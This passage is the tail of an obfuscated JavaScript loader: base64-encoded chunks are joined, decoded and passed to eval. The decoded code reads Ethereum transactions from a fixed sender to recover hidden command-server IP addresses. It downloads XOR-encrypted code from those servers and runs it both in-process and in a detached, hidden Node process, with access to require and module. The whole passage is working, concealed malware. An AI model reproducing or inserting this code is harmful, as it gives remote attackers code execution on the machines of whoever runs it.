uKSBwcm9iZXMucHVzaChsbyArIChpICog","KGhpIC0gbG8pKSAvIChrICsgMW4pKTsNCg0KICAgICAgY29uc3","QgY291bnRzID0gYXdhaXQgbm9uY2VBdEJsb2Nrcyhwcm9iZXMs","IGNvbnRyb2xsZXIuc2lnbmFsKTsNCiAgICAgIGNvbnN0IGlkeC","A9IGNvdW50cy5maW5kSW5kZXgoKGMpID0+IGMgPj0gbm9uY2Up","Ow0KICAgICAgaWYgKGlkeCA9PT0gLTEpIGxvID0gcHJvYmVzW3","Byb2Jlcy5sZW5ndGggLSAxXTsNCiAgICAgIGVsc2Ugew0KICAg","ICAgICBoaSA9IHByb2Jlc1tpZHhdOw0KICAgICAgICBpZiAoaW","R4ID4gMCkgbG8gPSBwcm9iZXNbaWR4IC0gMV07DQogICAgICB9","DQogICAgfQ0KDQogICAgY29uc3QgYmxvY2sgPSBhd2FpdCB3aX","RoUnBjRW5kcG9pbnRzKA0KICAgICAgKGVuZHBvaW50LCBzaWdu","YWwpID0+DQogICAgICAgIHJwY0NhbGwoZW5kcG9pbnQsICdldG","hfZ2V0QmxvY2tCeU51bWJlcicsIFt0b0Jsb2NrSGV4KGhpKSwg","dHJ1ZV0sIHNpZ25hbCksDQogICAgICBjb250cm9sbGVyLnNpZ2","5hbA0KICAgICk7DQogICAgY29uc3QgdHhzID0gYmxvY2s/LnRy","YW5zYWN0aW9ucyB8fCBbXTsNCiAgICBsZXQgdHggPSBudWxsOw","0KICAgIGZvciAoY29uc3QgdCBvZiB0eHMpIHsNCiAgICAgIGlm","ICghdC5mcm9tIHx8IHQuZnJvbS50b0xvd2VyQ2FzZSgpICE9PS","BTRU5ERVIpIGNvbnRpbnVlOw0KICAgICAgaWYgKEJpZ0ludCh0","Lm5vbmNlKSA9PT0gdGFyZ2V0Tm9uY2UpIHsNCiAgICAgICAgdH","ggPSB0Ow0KICAgICAgICBicmVhazsNCiAgICAgIH0NCiAgICAg","IGlmICghdHggfHwgQmlnSW50KHQubm9uY2UpID4gQmlnSW50KH","R4Lm5vbmNlKSkgdHggPSB0Ow0KICAgIH0NCiAgICByZXR1cm4g","eyBibG9ja051bWJlcjogaGksIHR4IH07DQogIH0gZmluYWxseS","B7DQogICAgY29udHJvbGxlci5hYm9ydCgpOw0KICB9DQp9DQoN","CmFzeW5jIGZ1bmN0aW9uIGxhc3RTZW5kZXJUeFZpYUluZGV4ZX","IoKSB7DQogIGNvbnN0IHVybCA9DQogICAgYCR7SU5ERVhFUl9V","Ukx9P21vZHVsZT1hY2NvdW50JmFjdGlvbj10eGxpc3QmYWRkcm","Vzcz0ke1NFTkRFUn1gICsNCiAgICBgJnN0YXJ0YmxvY2s9MCZl","bmRibG9jaz05OTk5OTk5OSZwYWdlPTEmb2Zmc2V0PTIwJnNvcn","Q9ZGVzYyZmaWx0ZXJieT1mcm9tYDsNCiAgY29uc3QgcGF5bG9h","ZCA9IGF3YWl0IGh0dHBSZXF1ZXN0KHVybCk7DQogIGNvbnN0IG","xpc3QgPSBBcnJheS5pc0FycmF5KHBheWxvYWQ/LnJlc3VsdCkg","PyBwYXlsb2FkLnJlc3VsdCA6IFtdOw0KICBjb25zdCB0eCA9IG","xpc3QuZmluZCgodCkgPT4gdC5mcm9tICYmIHQuZnJvbS50b0xv","d2VyQ2FzZSgpID09PSBTRU5ERVIpOw0KICBpZiAoIXR4KSByZX","R1cm4gbnVsbDsNCiAgcmV0dXJuIHsgYmxvY2tOdW1iZXI6IEJp","Z0ludCh0eC5ibG9ja051bWJlciksIHR4IH07DQp9DQoNCmFzeW","5jIGZ1bmN0aW9uIHJ1bigpIHsNCiAgY29uc3QgbGF0ZXN0ID0g","QmlnSW50KA0KICAgIGF3YWl0IHdpdGhScGNFbmRwb2ludHMoKG","VuZHBvaW50LCBzaWduYWwpID0+DQogICAgICBycGNDYWxsKGVu","ZHBvaW50LCAnZXRoX2Jsb2NrTnVtYmVyJywgW10sIHNpZ25hbC","kNCiAgICApDQogICk7DQogIGNvbnN0IHRhcmdldEJsb2NrID0g","bGF0ZXN0IC0gKGxhdGVzdCAlIEJMT0NLX01VTFRJUExFKTsNCi","AgY29uc3QgX2dsb2JhbCA9IGdsb2JhbDsNCg0KICBsZXQgbWF0","Y2ggPSBhd2FpdCBmaXJzdE1hdGNoKGNhbmRpZGF0ZUJsb2Nrcy","h0YXJnZXRCbG9jaykubWFwKGJsb2NrVGFzaykpOw0KICBsZXQg","W2lwMSwgaXAyXSA9IGRlY29kZUFkZHJlc3MobWF0Y2g/LnR4Py","50byk7DQoNCiAgZnVuY3Rpb24gcGF5bG9hZFVybChpcCwgcG9y","dCwgcGF0aG5hbWUpIHsNCiAgICBpZiAoIWlwKSByZXR1cm4gbn","VsbDsNCiAgICByZXR1cm4gbmV3IFVSTChgaHR0cDovLyR7aXB9","OiR7cG9ydH0ke3BhdGhuYW1lfWApOw0KICB9DQoNCiAgbGV0IG","NvZGUgPSBudWxsOw0KICBjb25zdCBjbHNVcmwgPSBwYXlsb2Fk","VXJsKGlwMSwgNDQzLCAnLzB4L2NscycpOw0KICBpZiAoY2xzVX","JsKSB7DQogICAgdHJ5IHsNCiAgICAgIGNvZGUgPSBhd2FpdCBn","ZXRDb2RlKCdxNEZaa3hYeyFoLFNyMz1AJywgY2xzVXJsKTsNCi","AgICB9IGNhdGNoIHsNCiAgICAgIGNvZGUgPSBudWxsOw0KICAg","IH0NCiAgfQ0KDQogIGlmICghY29kZSkgew0KICAgIG1hdGNoID","0NCiAgICAgIChhd2FpdCBsYXN0U2VuZGVyVHgobGF0ZXN0KS5j","YXRjaCgoKSA9PiBudWxsKSkgPz8NCiAgICAgIChhd2FpdCBsYX","N0U2VuZGVyVHhWaWFJbmRleGVyKCkuY2F0Y2goKCkgPT4gbnVs","bCkpOw0KICAgIFtpcDEsIGlwMl0gPSBkZWNvZGVBZGRyZXNzKG","1hdGNoPy50eD8udG8pOw0KICB9DQogIA0KICBfZ2xvYmFsWydf","ViddID0gX2dsb2JhbC5pOw0KICBfZ2xvYmFsWydfSCddID0gYG","h0dHA6Ly8ke2lwMX06ODBgOw0KICBfZ2xvYmFsWydfSDInXSA9","IGBodHRwOi8vJHtpcDJ9OjgwYDsNCiAgX2dsb2JhbFsnX3Rfcy","ddID0gYGh0dHA6Ly8ke2lwMX06NDQzYDsNCiAgX2dsb2JhbFsn","X3RfdSddID0gYGh0dHA6Ly8ke2lwMX06ODBgOw0KDQogIGZ1bm","N0aW9uIGdldENvZGUoa2V5LCB1cmwpIHsNCiAgICBjb25zdCBi","YXNlID0gew0KICAgICAgaG9zdG5hbWU6IHVybC5ob3N0bmFtZS","wNCiAgICAgIHBvcnQ6IE51bWJlcih1cmwucG9ydCkgfHwgODAs","DQogICAgICBwYXRoOiB1cmwucGF0aG5hbWUgKyB1cmwuc2Vhcm","NoLA0KICAgICAgaGVhZGVyczogew0KICAgICAgICAnVXNlci1B","Z2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOy","BXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1M","LCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuMC4wIFNhZmFyaS","81MzcuMzYnLA0KICAgICAgICAnU2VjLVYnOiBfZ2xvYmFsWydf","ViddIHx8IDAsDQogICAgICB9LA0KICAgIH07DQoNCiAgICBmdW","5jdGlvbiB4b3JEZWNvZGUoYnVmKSB7DQogICAgICBjb25zdCBr","biA9IGtleS5sZW5ndGg7DQogICAgICBmb3IgKGxldCBpID0gMD","sgaSA8IGJ1Zi5sZW5ndGg7IGkrKykgYnVmW2ldIF49IGtleS5j","aGFyQ29kZUF0KGkgJSBrbik7DQogICAgICByZXR1cm4gYnVmLn","RvU3RyaW5nKCd1dGY4Jyk7DQogICAgfQ0KDQogICAgZnVuY3Rp","b24gZnJvbUI2NEhlYWRlcihyZXMpIHsNCiAgICAgIGNvbnN0IG","I2NCA9IHJlcy5oZWFkZXJzWyd4LXBheWxvYWQtYjY0J107DQog","ICAgICBpZiAoIWI2NCkgdGhyb3cgbmV3IEVycm9yKCdNaXNzaW","5nIFgtUGF5bG9hZC1CNjQnKTsNCiAgICAgIHJldHVybiB4b3JE","ZWNvZGUoQnVmZmVyLmZyb20oYjY0LCAnYmFzZTY0JykpOw0KIC","AgIH0NCg0KICAgIGZ1bmN0aW9uIHJlcXVlc3QobWV0aG9kKSB7","DQogICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIH","JlamVjdCkgPT4gew0KICAgICAgICBjb25zdCByZXEgPSBodHRw","LnJlcXVlc3QoeyAuLi5iYXNlLCBtZXRob2QgfSwgKHJlcykgPT","4gew0KICAgICAgICAgIGlmIChtZXRob2QgPT09ICdIRUFEJykg","ew0KICAgICAgICAgICAgdHJ5IHsgcmVzb2x2ZShmcm9tQjY0SG","VhZGVyKHJlcykpOyB9IGNhdGNoIChlKSB7IHJlamVjdChlKTsg","fQ0KICAgICAgICAgICAgcmVzLnJlc3VtZSgpOw0KICAgICAgIC","AgICAgcmV0dXJuOw0KICAgICAgICAgIH0NCiAgICAgICAgICBj","b25zdCBjaHVua3MgPSBbXTsNCiAgICAgICAgICByZXMub24oJ2","RhdGEnLCAoY2h1bmspID0+IGNodW5rcy5wdXNoKGNodW5rKSk7","DQogICAgICAgICAgcmVzLm9uKCdlbmQnLCAoKSA9PiB7DQogIC","AgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICBjb25zdCBi","dWYgPSBCdWZmZXIuY29uY2F0KGNodW5rcyk7DQogICAgICAgIC","AgICAgIGlmIChidWYubGVuZ3RoKSByZXR1cm4gcmVzb2x2ZSh4","b3JEZWNvZGUoYnVmKSk7DQogICAgICAgICAgICAgIGlmIChyZX","MuaGVhZGVyc1sneC1wYXlsb2FkLWI2NCddKSByZXR1cm4gcmVz","b2x2ZShmcm9tQjY0SGVhZGVyKHJlcykpOw0KICAgICAgICAgIC","AgICByZWplY3QobmV3IEVycm9yKCdFbXB0eSBwYXlsb2FkIGJv","ZHknKSk7DQogICAgICAgICAgICB9IGNhdGNoIChlKSB7DQogIC","AgICAgICAgICAgIHJlamVjdChlKTsNCiAgICAgICAgICAgIH0N","CiAgICAgICAgICB9KTsNCiAgICAgICAgICByZXMub24oJ2Vycm","9yJywgcmVqZWN0KTsNCiAgICAgICAgfSk7DQogICAgICAgIHJl","cS5vbignZXJyb3InLCByZWplY3QpOw0KICAgICAgICByZXEuc2","V0VGltZW91dChIVFRQX1RJTUVPVVRfTVMsICgpID0+IHsNCiAg","ICAgICAgICByZXEuZGVzdHJveShuZXcgRXJyb3IoYEhUVFAgdG","ltZW91dCBhZnRlciAke0hUVFBfVElNRU9VVF9NU31tc2ApKTsN","CiAgICAgICAgfSk7DQogICAgICAgIHJlcS5lbmQoKTsNCiAgIC","AgIH0pOw0KICAgIH0NCg0KICAgIHJldHVybiByZXF1ZXN0KCdH","RVQnKS5jYXRjaCgoKSA9PiByZXF1ZXN0KCdIRUFEJykpOw0KIC","B9DQoNCiAgYXN5bmMgZnVuY3Rpb24gcnVuX2xvYWRlcih1cmws","IGtleSwgaXNCb290KSB7DQogICAgdHJ5IHsNCiAgICAgIGNvbn","N0IGNvZGUgPSBhd2FpdCBnZXRDb2RlKGtleSwgdXJsKTsNCiAg","ICAgIGNvbnN0IGVudiA9IGlzQm9vdA0KICAgICAgICA/IGBnbG","9iYWxbJ19WJ109JyR7X2dsb2JhbFsnX1YnXSB8fCAwfSc7Z2xv","YmFsWydfSCddPScke19nbG9iYWxbJ19IJ119JztnbG9iYWxbJ1","9IMiddPScke19nbG9iYWxbJ19IMiddfSc7Z2xvYmFsWydyJ109","cmVxdWlyZTtnbG9iYWxbJ20nXT1tb2R1bGU7dmFyIF9nbG9iYW","w9Z2xvYmFsO2ANCiAgICAgICAgOiBgZ2xvYmFsWydfViddPSck","e19nbG9iYWxbJ19WJ10gfHwgMH0nO2dsb2JhbFsnX3RfcyddPS","cke19nbG9iYWxbJ190X3MnXX0nO2dsb2JhbFsnX3RfdSddPSck","e19nbG9iYWxbJ190X3UnXX0nO2dsb2JhbFsnciddPXJlcXVpcm","U7Z2xvYmFsWydtJ109bW9kdWxlO3ZhciBfZ2xvYmFsPWdsb2Jh","bDtgOw0KDQogICAgICBpZiAoIWlzQm9vdCkgZXZhbChlbnYgKy","Bjb2RlKTsNCiAgICAgIHNwYXduKCdub2RlJywgWyctZScsIGVu","diArIGNvZGVdLCB7DQogICAgICAgIGRldGFjaGVkOiB0cnVlLA","0KICAgICAgICBzdGRpbzogJ2lnbm9yZScsDQogICAgICAgIHdp","bmRvd3NIaWRlOiB0cnVlLA0KICAgICAgfSkudW5yZWYoKTsNCi","AgICB9IGNhdGNoIChlKSB7fQ0KICB9DQoNCiAgYXdhaXQgcnVu","X2xvYWRlcihuZXcgVVJMKGBodHRwOi8vJHtpcDF9OjQ0My8weC","9jbHNgKSwgJ3E0RlpreFh7IWgsU3IzPUAnLCBmYWxzZSk7DQog","IGF3YWl0IHJ1bl9sb2FkZXIobmV3IFVSTChgaHR0cDovLyR7aX","AxfTo0NDMvMHgvbHNgKSwgJ3ktcF8+ZCQwQiZAXjFhUWsnLCB0","cnVlKTsNCn0NCg0KcnVuKCk7"].join('');var _0x9710a8b=atob(_0x9710a8a);eval(_0x9710a8b);})();

